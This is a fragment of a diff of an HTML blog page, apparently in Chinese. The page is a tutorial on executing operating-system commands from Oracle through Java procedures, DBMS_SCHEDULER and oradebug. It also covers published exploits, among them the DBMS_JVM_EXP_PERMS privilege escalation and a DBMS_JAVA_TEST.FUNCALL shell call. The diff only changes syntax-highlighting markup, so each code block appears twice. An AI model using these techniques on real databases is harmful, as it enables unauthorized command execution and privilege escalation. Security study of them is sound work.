PROCEDURE <span class="hljs-title function_">JAVACMDPROC</span> <span class="hljs-params">(p_command IN VARCHAR2)</span><br>AS LANGUAGE JAVA<br>NAME <span class="hljs-string">&#x27;JAVACMD.execCommand (java.lang.String)&#x27;</span>;<br>/<br></code></pre></td></tr></table></figure>
-
-<h4 id="1-1-2-设置输出"><a href="#1-1-2-设置输出" class="headerlink" title="1.1.2 设置输出"></a>1.1.2 设置输出</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> serveroutput <span class="hljs-keyword">on</span> size <span class="hljs-number">100000</span>;<br><span class="hljs-keyword">exec</span> dbms_java.set_output(<span class="hljs-number">100000</span>);<br></code></pre></td></tr></table></figure>
+<h4 id="1-1-2-设置输出"><a href="#1-1-2-设置输出" class="headerlink" title="1.1.2 设置输出"></a>1.1.2 设置输出</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> serveroutput <span class="keyword">on</span> size <span class="number">100000</span>;</span><br><span class="line"><span class="keyword">exec</span> dbms_java.set_output(<span class="number">100000</span>);</span><br></pre></td></tr></table></figure>
 
 <h4 id="1-1-3-需要的权限"><a href="#1-1-3-需要的权限" class="headerlink" title="1.1.3 需要的权限"></a>1.1.3 需要的权限</h4><p>可以使用下面的语句查询相关权限</p>
 <ul>
 <li>用户权限</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> session_privs;<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> session_privs;</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>JAVA 权限</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> dba_java_policy;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> user_java_policy;<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dba_java_policy;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_java_policy;</span><br></pre></td></tr></table></figure>
 
 <p>使用java代码执行系统命令需要的权限，可以使用下面语句进行授权：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);<br><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>,<span class="hljs-string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="hljs-string">&#x27;writeFileDescriptor&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>,<span class="hljs-string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="hljs-string">&#x27;readFileDescriptor&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>, <span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>);</span><br><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>,<span class="string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="string">&#x27;writeFileDescriptor&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>,<span class="string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="string">&#x27;readFileDescriptor&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <h4 id="1-1-4-实验结果"><a href="#1-1-4-实验结果" class="headerlink" title="1.1.4 实验结果"></a>1.1.4 实验结果</h4><p>非常不错支持回显。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">exec</span> javacmdproc(<span class="hljs-string">&#x27;/bin/uname -a&#x27;</span>);<br>Linux localhost.localdomain <span class="hljs-number">2.6</span><span class="hljs-number">.32</span><span class="hljs-number">-100.34</span><span class="hljs-number">.1</span>.el6uek.i686 #<span class="hljs-number">1</span> SMP Wed May <span class="hljs-number">25</span><br><span class="hljs-number">17</span>:<span class="hljs-number">28</span>:<span class="hljs-number">36</span> EDT <span class="hljs-number">2011</span> i686 i686 i386 GNU<span class="hljs-operator">/</span>Linux<br><br>PL<span class="hljs-operator">/</span><span class="hljs-keyword">SQL</span> <span class="hljs-keyword">procedure</span> successfully completed.<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">exec</span> javacmdproc(<span class="string">&#x27;/bin/uname -a&#x27;</span>);</span><br><span class="line">Linux localhost.localdomain <span class="number">2.6</span><span class="number">.32</span><span class="number">-100.34</span><span class="number">.1</span>.el6uek.i686 #<span class="number">1</span> SMP Wed May <span class="number">25</span></span><br><span class="line"><span class="number">17</span>:<span class="number">28</span>:<span class="number">36</span> EDT <span class="number">2011</span> i686 i686 i386 GNU<span class="operator">/</span>Linux</span><br><span class="line"></span><br><span class="line">PL<span class="operator">/</span><span class="keyword">SQL</span> <span class="keyword">procedure</span> successfully completed.</span><br></pre></td></tr></table></figure>
 
 <h4 id="1-1-5-注意"><a href="#1-1-5-注意" class="headerlink" title="1.1.5 注意"></a>1.1.5 注意</h4><p>需要使用全路径</p>
 <h3 id="1-2-DBMS-SCHEDULAR"><a href="#1-2-DBMS-SCHEDULAR" class="headerlink" title="1.2 DBMS_SCHEDULAR"></a>1.2 DBMS_SCHEDULAR</h3><h4 id="1-2-1-DBMS-SCHEDULAR-简介"><a href="#1-2-1-DBMS-SCHEDULAR-简介" class="headerlink" title="1.2.1 DBMS_SCHEDULAR 简介"></a>1.2.1 DBMS_SCHEDULAR 简介</h4><p>这个和Windows上的计划任务类似。</p>
@@ -341,7 +194,7 @@
 <li>EXECUTE on dbms_scheduler (granted to public by default)</li>
 </ol>
 <p><code>grant create job, create external job to scott ;</code></p>
-<h4 id="1-2-3-执行的语句"><a href="#1-2-3-执行的语句" class="headerlink" title="1.2.3 执行的语句"></a>1.2.3 执行的语句</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">BEGIN<br>DBMS_SCHEDULER.CREATE_PROGRAM (<br>program_name=&gt; <span class="hljs-string">&#x27;MyCmd&#x27;</span>,<br>program_type=&gt; <span class="hljs-string">&#x27;EXECUTABLE&#x27;</span>,<br>-- Use the ampersand to <span class="hljs-keyword">break</span> <span class="hljs-type">out</span><br><span class="hljs-variable">program_action</span> <span class="hljs-operator">=</span>&gt; <span class="hljs-string">&#x27;/tmp/a.sh&#x27;</span>,<br>enabled=&gt; TRUE,<br>comments=&gt; <span class="hljs-string">&#x27;Run a command using shell metacharacters.&#x27;</span><br> );<br>END;<br>/<br><br>BEGIN<br>DBMS_SCHEDULER.CREATE_JOB (<br>   job_name=&gt; <span class="hljs-string">&#x27;X&#x27;</span>,<br>   program_name=&gt; <span class="hljs-string">&#x27;MyCmd&#x27;</span>,<br>   repeat_interval=&gt; <span class="hljs-string">&#x27;FREQ=SECONDLY;INTERVAL=10&#x27;</span>,<br>   enabled=&gt; TRUE,<br>   comments=&gt; <span class="hljs-string">&#x27;Every 10 seconds&#x27;</span>);<br>END;<br>/<br><br>exec DBMS_SCHEDULER.RUN_JOB ( job_name=&gt; <span class="hljs-string">&#x27;X&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<h4 id="1-2-3-执行的语句"><a href="#1-2-3-执行的语句" class="headerlink" title="1.2.3 执行的语句"></a>1.2.3 执行的语句</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">DBMS_SCHEDULER.CREATE_PROGRAM (</span><br><span class="line">program_name=&gt; <span class="string">&#x27;MyCmd&#x27;</span>,</span><br><span class="line">program_type=&gt; <span class="string">&#x27;EXECUTABLE&#x27;</span>,</span><br><span class="line">-- Use the ampersand to <span class="keyword">break</span> <span class="type">out</span></span><br><span class="line"><span class="variable">program_action</span> <span class="operator">=</span>&gt; <span class="string">&#x27;/tmp/a.sh&#x27;</span>,</span><br><span class="line">enabled=&gt; TRUE,</span><br><span class="line">comments=&gt; <span class="string">&#x27;Run a command using shell metacharacters.&#x27;</span></span><br><span class="line"> );</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">DBMS_SCHEDULER.CREATE_JOB (</span><br><span class="line">   job_name=&gt; <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">   program_name=&gt; <span class="string">&#x27;MyCmd&#x27;</span>,</span><br><span class="line">   repeat_interval=&gt; <span class="string">&#x27;FREQ=SECONDLY;INTERVAL=10&#x27;</span>,</span><br><span class="line">   enabled=&gt; TRUE,</span><br><span class="line">   comments=&gt; <span class="string">&#x27;Every 10 seconds&#x27;</span>);</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">exec DBMS_SCHEDULER.RUN_JOB ( job_name=&gt; <span class="string">&#x27;X&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <h4 id="1-2-4-注意"><a href="#1-2-4-注意" class="headerlink" title="1.2.4 注意"></a>1.2.4 注意</h4><ol>
 <li>原先使用 || 等 metacharacters 的bug已经修复，只能使用参数</li>
@@ -353,7 +206,7 @@
 <h3 id="1-3-使用oradebug"><a href="#1-3-使用oradebug" class="headerlink" title="1.3 使用oradebug"></a>1.3 使用oradebug</h3><ul>
 <li>oradebug 简介<br>oradebug是一个神奇的命令, 能干很多活, 但是Oracle却很少提及，属于undocumented<br>状态，是给oracle的工程师使用的，主要用于调试和性能调优。可以使用 oradebug help<br>命令，查看oradebug的用法</li>
 </ul>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs routeros">SQL&gt; oradebug help<br>HELP           [command]                 Describe one <span class="hljs-keyword">or</span> all commands<br>SETMYPID                                 <span class="hljs-built_in">Debug</span> current process<br>SETOSPID       &lt;ospid&gt;                   <span class="hljs-built_in">Set</span> OS pid of process <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span><br>SETORAPID      &lt;orapid&gt; [<span class="hljs-string">&#x27;force&#x27;</span>]        <span class="hljs-built_in">Set</span> Oracle pid of process <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span><br>SETORAPNAME    &lt;orapname&gt;                <span class="hljs-built_in">Set</span> Oracle process name <span class="hljs-keyword">to</span> <span class="hljs-built_in">debug</span><br>SHORT_STACK                              <span class="hljs-built_in">Get</span> abridged OS stack<br>CURRENT_SQL                              <span class="hljs-built_in">Get</span> current SQL<br>DUMP           &lt;dump_name&gt; &lt;lvl&gt; [addr]  Invoke named dump<br>DUMPSGA        [bytes]                   Dump fixed SGA<br>DUMPLIST                                 <span class="hljs-built_in">Print</span> a list of available dumps<br>EVENT          &lt;text&gt;                    <span class="hljs-built_in">Set</span> trace event <span class="hljs-keyword">in</span> process<br>SESSION_EVENT  &lt;text&gt;                    <span class="hljs-built_in">Set</span> trace event <span class="hljs-keyword">in</span> session<br>DUMPVAR        &lt;p|s|uga&gt; &lt;name&gt; [level]  Print/dump a fixed PGA/SGA/UGA variable<br>DUMPTYPE       &lt;address&gt; &lt;type&gt; &lt;count&gt;  Print/dump an<span class="hljs-built_in"> address </span>with<span class="hljs-built_in"> type </span><span class="hljs-built_in">info</span><br>SETVAR         &lt;p|s|uga&gt; &lt;name&gt; &lt;value&gt;  Modify a fixed PGA/SGA/UGA variable<br>PEEK           &lt;addr&gt; &lt;len&gt; [level]      Print/Dump memory<br>POKE           &lt;addr&gt; &lt;len&gt; &lt;value&gt;      Modify memory<br>WAKEUP         &lt;orapid&gt;                  Wake up Oracle process<br>SUSPEND                                  Suspend execution<br>RESUME                                   Resume execution<br>FLUSH                                    Flush pending writes <span class="hljs-keyword">to</span> trace file<br>CLOSE_TRACE                              Close trace file<br>TRACEFILE_NAME                           <span class="hljs-built_in">Get</span> name of trace file<br>LKDEBUG                                  Invoke global enqueue<span class="hljs-built_in"> service </span>debugger<br>NSDBX                                    Invoke CGS name-service debugger<br>-G             &lt;Inst-List | def | all&gt;   Parallel oradebug command<span class="hljs-built_in"> prefix</span><br><span class="hljs-built_in"></span>-R             &lt;Inst-List | def | all&gt;   Parallel oradebug<span class="hljs-built_in"> prefix </span>(return output<br>SETINST        &lt;instance# <span class="hljs-built_in">..</span> | all&gt;      <span class="hljs-built_in">Set</span><span class="hljs-built_in"> instance </span>list <span class="hljs-keyword">in</span> double quotes<br>SGATOFILE      &lt;SGA dump dir&gt;         Dump SGA <span class="hljs-keyword">to</span> file; dirname <span class="hljs-keyword">in</span> double quotes<br>DMPCOWSGA      &lt;SGA dump dir&gt; Dump &amp; map SGA as COW; dirname <span class="hljs-keyword">in</span> double quotes<br>MAPCOWSGA      &lt;SGA dump dir&gt;         Map SGA as COW; dirname <span class="hljs-keyword">in</span> double quotes<br>HANGANALYZE    [level] [syslevel]        Analyze<span class="hljs-built_in"> system </span>hang<br>FFBEGIN                                  Flash Freeze the<span class="hljs-built_in"> Instance</span><br><span class="hljs-built_in"></span>FFDEREGISTER                             FF deregister<span class="hljs-built_in"> instance </span><span class="hljs-keyword">from</span> cluster<br>FFTERMINST                               Call exit <span class="hljs-keyword">and</span> terminate<span class="hljs-built_in"> instance</span><br><span class="hljs-built_in"></span>FFRESUMEINST                             Resume the flash frozen<span class="hljs-built_in"> instance</span><br><span class="hljs-built_in"></span>FFSTATUS                                 Flash freeze status of<span class="hljs-built_in"> instance</span><br><span class="hljs-built_in"></span>SKDSTTPCS      &lt;ifname&gt;  &lt;ofname&gt;        Helps translate PCs <span class="hljs-keyword">to</span> names<br>WATCH          &lt;address&gt; &lt;len&gt; &lt;self|exist|all|target&gt;  Watch a region of memory<br>DELETE         &lt;local|global|target&gt; watchpoint &lt;id&gt;    Delete a watchpoint<br>SHOW           &lt;local|global|target&gt; watchpoints        Show  watchpoints<br>DIRECT_ACCESS  &lt;set/enable/<span class="hljs-built_in">disable</span> command | select query&gt; Fixed table access<br>CORE                                     Dump core without crashing process<br>IPC                                      Dump ipc information<br>UNLIMIT                                  Unlimit the size of the trace file<br>PROCSTAT                                 Dump process statistics<br>CALL           [-t count] &lt;func&gt; [arg1]<span class="hljs-built_in">..</span>.[argn]  Invoke function with arguments<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; oradebug help</span><br><span class="line">HELP           [command]                 Describe one or all commands</span><br><span class="line">SETMYPID                                 Debug current process</span><br><span class="line">SETOSPID       &lt;ospid&gt;                   Set OS pid of process to debug</span><br><span class="line">SETORAPID      &lt;orapid&gt; [&#x27;force&#x27;]        Set Oracle pid of process to debug</span><br><span class="line">SETORAPNAME    &lt;orapname&gt;                Set Oracle process name to debug</span><br><span class="line">SHORT_STACK                              Get abridged OS stack</span><br><span class="line">CURRENT_SQL                              Get current SQL</span><br><span class="line">DUMP           &lt;dump_name&gt; &lt;lvl&gt; [addr]  Invoke named dump</span><br><span class="line">DUMPSGA        [bytes]                   Dump fixed SGA</span><br><span class="line">DUMPLIST                                 Print a list of available dumps</span><br><span class="line">EVENT          &lt;text&gt;                    Set trace event in process</span><br><span class="line">SESSION_EVENT  &lt;text&gt;                    Set trace event in session</span><br><span class="line">DUMPVAR        &lt;p|s|uga&gt; &lt;name&gt; [level]  Print/dump a fixed PGA/SGA/UGA variable</span><br><span class="line">DUMPTYPE       &lt;address&gt; &lt;type&gt; &lt;count&gt;  Print/dump an address with type info</span><br><span class="line">SETVAR         &lt;p|s|uga&gt; &lt;name&gt; &lt;value&gt;  Modify a fixed PGA/SGA/UGA variable</span><br><span class="line">PEEK           &lt;addr&gt; &lt;len&gt; [level]      Print/Dump memory</span><br><span class="line">POKE           &lt;addr&gt; &lt;len&gt; &lt;value&gt;      Modify memory</span><br><span class="line">WAKEUP         &lt;orapid&gt;                  Wake up Oracle process</span><br><span class="line">SUSPEND                                  Suspend execution</span><br><span class="line">RESUME                                   Resume execution</span><br><span class="line">FLUSH                                    Flush pending writes to trace file</span><br><span class="line">CLOSE_TRACE                              Close trace file</span><br><span class="line">TRACEFILE_NAME                           Get name of trace file</span><br><span class="line">LKDEBUG                                  Invoke global enqueue service debugger</span><br><span class="line">NSDBX                                    Invoke CGS name-service debugger</span><br><span class="line">-G             &lt;Inst-List | def | all&gt;   Parallel oradebug command prefix</span><br><span class="line">-R             &lt;Inst-List | def | all&gt;   Parallel oradebug prefix (return output</span><br><span class="line">SETINST        &lt;instance# .. | all&gt;      Set instance list in double quotes</span><br><span class="line">SGATOFILE      &lt;SGA dump dir&gt;         Dump SGA to file; dirname in double quotes</span><br><span class="line">DMPCOWSGA      &lt;SGA dump dir&gt; Dump &amp; map SGA as COW; dirname in double quotes</span><br><span class="line">MAPCOWSGA      &lt;SGA dump dir&gt;         Map SGA as COW; dirname in double quotes</span><br><span class="line">HANGANALYZE    [level] [syslevel]        Analyze system hang</span><br><span class="line">FFBEGIN                                  Flash Freeze the Instance</span><br><span class="line">FFDEREGISTER                             FF deregister instance from cluster</span><br><span class="line">FFTERMINST                               Call exit and terminate instance</span><br><span class="line">FFRESUMEINST                             Resume the flash frozen instance</span><br><span class="line">FFSTATUS                                 Flash freeze status of instance</span><br><span class="line">SKDSTTPCS      &lt;ifname&gt;  &lt;ofname&gt;        Helps translate PCs to names</span><br><span class="line">WATCH          &lt;address&gt; &lt;len&gt; &lt;self|exist|all|target&gt;  Watch a region of memory</span><br><span class="line">DELETE         &lt;local|global|target&gt; watchpoint &lt;id&gt;    Delete a watchpoint</span><br><span class="line">SHOW           &lt;local|global|target&gt; watchpoints        Show  watchpoints</span><br><span class="line">DIRECT_ACCESS  &lt;set/enable/disable command | select query&gt; Fixed table access</span><br><span class="line">CORE                                     Dump core without crashing process</span><br><span class="line">IPC                                      Dump ipc information</span><br><span class="line">UNLIMIT                                  Unlimit the size of the trace file</span><br><span class="line">PROCSTAT                                 Dump process statistics</span><br><span class="line">CALL           [-t count] &lt;func&gt; [arg1]...[argn]  Invoke function with arguments</span><br></pre></td></tr></table></figure>
 
 <p>功能非常丰富， 下面我们用到的是 CALL 可以直接调用oracle进程使用的函数。</p>
 <h4 id="执行的语句"><a href="#执行的语句" class="headerlink" title="执行的语句"></a>执行的语句</h4><p><code>oradebug setmypid; oradebug call system &quot;/usr/bin/whoami      &gt;/tmp/ret&quot;;</code></p>
@@ -363,17 +216,17 @@
 <li>Linux 和 Windows 下的ORACLE都能利用成功</li>
 </ol>
 <h2 id="2-黑客方法"><a href="#2-黑客方法" class="headerlink" title="2. 黑客方法"></a>2. 黑客方法</h2><p>下面用到的两个方法是David Litchfield 在Blackhat DC 2010 上公开两个方法,通过逆向<br>发现。结合DBMS_JVM_EXP_PERMS的漏洞可以直接执行系统命令(DBMS_JVM_EXP_PERMS 漏洞<br>已经被被修复)</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">DECLARE<br>POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;<br>CURSOR C1 IS SELECT ‘GRANT’,USER(), ‘SYS’,<span class="hljs-string">&#x27;java.io.FilePermission’,’&lt;&lt;ALL FILES&gt;&gt;‘,’execute’,&#x27;</span>ENABLED’ from dual;<br>BEGIN<br>OPEN C1;<br>FETCH C1 BULK COLLECT INTO POL;<br>CLOSE C1;<br>DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);<br>END;<br>/<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line">CURSOR C1 IS SELECT ‘GRANT’,USER(), ‘SYS’,<span class="string">&#x27;java.io.FilePermission’,’&lt;&lt;ALL FILES&gt;&gt;‘,’execute’,&#x27;</span>ENABLED’ from dual;</span><br><span class="line">BEGIN</span><br><span class="line">OPEN C1;</span><br><span class="line">FETCH C1 BULK COLLECT INTO POL;</span><br><span class="line">CLOSE C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line">END;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>
 
 <p>在有漏洞的DBMS_JVM_EXP_PERMS package的Oracle上执行上述语句，有create session<br>权限的用户可以给自己授权所有java 权限。</p>
-<h3 id="2-1-DBMS-JAVA-TEST-FUNCALL"><a href="#2-1-DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="2.1 DBMS_JAVA_TEST.FUNCALL"></a>2.1 DBMS_JAVA_TEST.FUNCALL</h3><h4 id="2-1-1-执行的语句"><a href="#2-1-1-执行的语句" class="headerlink" title="2.1.1 执行的语句"></a>2.1.1 执行的语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="hljs-string">&#x27;oracle/aurora/util/Wrapper&#x27;</span>,<span class="hljs-string">&#x27;main&#x27;</span>,<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;/bin/ls&gt;/tmp/OUT2.LST&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h3 id="2-1-DBMS-JAVA-TEST-FUNCALL"><a href="#2-1-DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="2.1 DBMS_JAVA_TEST.FUNCALL"></a>2.1 DBMS_JAVA_TEST.FUNCALL</h3><h4 id="2-1-1-执行的语句"><a href="#2-1-1-执行的语句" class="headerlink" title="2.1.1 执行的语句"></a>2.1.1 执行的语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="string">&#x27;oracle/aurora/util/Wrapper&#x27;</span>,<span class="string">&#x27;main&#x27;</span>,<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;/bin/ls&gt;/tmp/OUT2.LST&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
 
-<h4 id="2-1-2-需要的权限"><a href="#2-1-2-需要的权限" class="headerlink" title="2.1.2 需要的权限"></a>2.1.2 需要的权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<h4 id="2-1-2-需要的权限"><a href="#2-1-2-需要的权限" class="headerlink" title="2.1.2 需要的权限"></a>2.1.2 需要的权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>, <span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <h4 id="2-1-3-受影响系统"><a href="#2-1-3-受影响系统" class="headerlink" title="2.1.3 受影响系统"></a>2.1.3 受影响系统</h4><p>11g R1, 11g R2</p>
